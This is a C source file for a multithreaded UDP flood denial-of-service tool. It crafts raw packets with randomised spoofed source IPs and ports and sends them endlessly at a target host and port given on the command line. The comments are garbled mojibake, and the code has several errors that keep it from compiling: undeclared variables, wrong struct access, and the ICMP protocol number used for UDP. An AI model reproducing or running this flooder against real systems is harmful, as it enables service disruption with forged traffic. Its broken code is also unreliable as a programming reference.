#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 

/* ����߳��� */
#define MAXCHILD 128
/* Ŀ��IP��ַ */
static unsigned long dest = 0;
static unsigned short dest_port = 0;
static unsigned long src = 0;
/* ICMPЭ���ֵ */
static int PROTO_UDP = -1;
/* ������־ */
static alive = -1;

/* ���������������
*  ����ϵͳ�ĺ���Ϊα�������
*	�����ʼ���йأ����ÿ���ò�ֵͬ���г�ʼ��
*/
static inline long 
	myrandom (int begin, int end)
{
	int gap = end - begin +1;
	int ret = 0;

	/* ��ϵͳʱ���ʼ�� */
	srand((unsigned)time(0));
	/* ����һ������begin��end֮���ֵ */
	ret = random(end)%gap + begin;
	return ret;
}

/* CRC16У�� */
static unsigned short
	DoS_cksum (unsigned short *data, int length)     
{  
	register int left = length;  
	register unsigned short *word = data;  
	register int sum = 0;  
	unsigned short ret = 0;  

	/* ����ż���ֽ� */
	while (left > 1)    
	{      
		sum += *word++;      
		left -= 2;    
	}  

	/* ���Ϊ����,�����һ���ֽڵ�������
	*	ʣ���һ���ֽ�Ϊ���ֽڹ���һ��short���ͱ���ֵ
	*/
	if (left == 1)    
	{      
		*(unsigned char *) (&ret) = *(unsigned char *) word;      
		sum += ret;    
	}  

	/* �۵� */
	sum = (sum >> 16) + (sum & 0xffff);  
	sum += (sum >> 16);  

	/* ȡ�� */
	ret = ~sum;  
	return (ret);
}

static void
	DoS_udp (unsigned long lamer)
{ 
#define K 1204
#define DATUML (3*K) /*UDP���ݲ��ֳ���*/
	
	/* �����ܳ��� */
	int tot_len = sizeof (struct ip) + sizeof (struct udphdr) +  DATUML;  
	/* ����Ŀ�ĵ�ַ */
	struct sockaddr_in to;  
	
	/* DOS�ṹ,��ΪIPͷ����UDPͷ����UDP���ݲ��� */
	struct   dosseg_t 
	{      
		struct ip iph;      
		struct udphdr udph;      
		unsigned char data[65535];    
	}  dosseg;  

	/* IP�İ汾,IPv4 */
	dosseg.iph->ip_v = 4;  
	/* IPͷ������,�ֽ��� */
	dosseg.iph->ip_hl = 5;  
	/* �������� */
	dosseg.iph->ip_tos = 0;  
	/* IP���ĵ��ܳ��� */
	dosseg.iph->ip_len = htons (tot_len);  
	/* ��ʶ,����ΪPID */
	dosseg.iph->ip_id = htons (getpid ());  
	/* �εı��˵�ַ */
	dosseg.iph->ip_off = 0; 
	/* TTL */
	dosseg.iph->ip_ttl = myrandom (200, 255);  ;  
	/* Э������ */
	dosseg.iph->ip_p = PROTO_UDP;  
	/* У���,����дΪ0 */
	dosseg.iph->ip_sum = 0;  
	/* ���͵�Դ��ַ */
	dosseg.iph->ip_src = (unsigned long) myrandom (0, 65535);       
	/* ����Ŀ���ַ */
	dosseg.iph->ip_dst = dest;    

	dosseg.iph->ip_sum =  DoS_cksum ((u16 *) & dosseg.iph, sizeof (dosseg.iph));  

#ifdef __FAVOR_BSD
	/* UDP Դ�˿� */
	dosseg.udph.uh_sport = (unsigned long) myrandom (0, 65535); ;
	/* UDPĿ�Ķ˿� */
	dosseg.udph.uh_dport = dest_port;
	/* UDP���ݳ��� */
	dosseg.udph.uh_ulen = htons(sizeof(dosseg.udph)+DATUML);
	/* У���,����д0 */
	dosseg.udph.uh_sum = 0;
	/* У��� */
	dosseg.udph.uh_sum = DoS_cksum((u16*)&dosseg.udph, tot_len);
#else
	/* UDP Դ�˿� */
	dosseg.udph.source = (unsigned long) myrandom (0, 65535); ;
	/* UDPĿ�Ķ˿� */
	dosseg.udph.dest = dest_port;
	/* UDP���ݳ��� */
	dosseg.udph.len = htons(sizeof(dosseg.udph)+DATUML);
	/* У���,����д0 */
	dosseg.udph.check = 0;
	/* У��� */
	dosseg.udph.check = DoS_cksum((u16*)&dosseg.udph, tot_len);
#endif
	

	/* ��д����Ŀ�ĵ�ַ���� */
	to.sin_family =  AF_INET;  
	to.sin_addr.s_addr = dest;
	to.sin_port = htons(0);

	/* �������� */
	sendto (rawsock, &dosseg, tot_len, 0, (struct sockaddr *) &to, sizeof (struct sockaddr));  
	
}

static void
DoS_fun (unsigned long ip)
{  
	while(alive)
	{
		DoS_udp();
	}

}

/* �źŴ�����,�����˳�����alive */
static void 
DoS_sig(int signo)
{
	alive = 0;
}



int main(int argc, char *argv[])
{
	struct hostent * host = NULL;
	struct protoent *protocol = NULL;
	char protoname[]= "icmp";

	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;
	
	alive = 1;
	/* ��ȡ�ź�CTRL+C */
	signal(SIGINT, DoS_sig);



	/* �����Ƿ�������ȷ */
	if(argc < 3)
	{
		return -1;
	}

	/* ��ȡЭ������ICMP */
	protocol = getprotobyname(protoname);
	if (protocol == NULL)
	{
		perror("getprotobyname()");
		return -1;
	}
	PROTO_UDP = protocol->p_proto;

	/* �����Ŀ�ĵ�ַΪ�ַ���IP��ַ */
	dest = inet_addr(argv[1]);
	if(dest == INADDR_NONE)
	{
		/* ΪDNS��ַ */
		host = gethostbyname(argv[1]);
		if(host == NULL)
		{
			perror("gethostbyname");
			return -1;
		}

		/* ����ַ������dest�� */
		memcpy((char *)&dest, host->h_addr.s_addr, host->h_length);
	}
	/* Ŀ�Ķ˿� */
	dest_port = atoi(argv[2]);

	/* ����ԭʼsocket */
	rawsock = socket (AF_INET, SOCK_RAW, RAW);	
	if (rawsock < 0)	   
		rawsock = socket (AF_INET, SOCK_RAW, PROTO_UDP);	

	/* ����IPѡ�� */
	setsockopt (rawsock, SOL_IP, IP_HDRINCL, "1", sizeof ("1"));

	/* ��������߳�Эͬ���� */
	for(i=0; i<MAXCHILD; i++)
	{
		err = pthread_create(&pthread[i], NULL, DoS_fun, NULL);
	}

	/* �ȴ��߳̽��� */
	for(i=0; i<MAXCHILD; i++)
	{
		pthread_join(pthread[i], NULL);
	}

	close(rawsock);
	
	return 0;
}




